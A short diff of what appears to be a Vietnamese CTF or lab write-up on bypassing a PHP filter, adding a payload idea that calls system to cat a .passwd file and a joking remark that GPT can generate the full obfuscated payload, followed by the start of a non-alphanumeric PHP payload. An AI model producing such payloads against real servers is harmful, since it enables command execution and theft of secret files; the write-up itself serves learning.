@@ -16,7 +16,9 @@ truy cập theo đường link
 
 ![image](https://github.com/user-attachments/assets/6213c94f-94b7-43e0-9dbc-c6d08817ece2)
 
-Dựa theo đó ta có payload 
+Dựa theo đó ta có payload ```SYSTEM(CAT[STRTOLOWER(.PASSWD())])```
+
+=))))) biết hướng rồi có thể bảo gpt nó generate ra cho đỡ mệt
 ```
 $_=[];
 $_=@"$_"; 
